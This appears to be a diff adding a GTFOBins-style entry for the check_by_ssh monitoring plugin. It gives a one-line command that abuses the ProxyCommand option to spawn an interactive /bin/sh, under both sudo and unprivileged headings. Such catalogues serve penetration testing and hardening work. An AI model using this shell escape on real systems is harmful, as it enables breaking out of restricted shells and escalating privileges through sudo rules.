@@ -1,0 +1,13 @@
+check_by_ssh
+============
+
+Shell
+-----
+
+[Sudo]
+    check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
+    The shell will only last 10 seconds.
+
+[Unprivileged]
+    check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
+    The shell will only last 10 seconds.
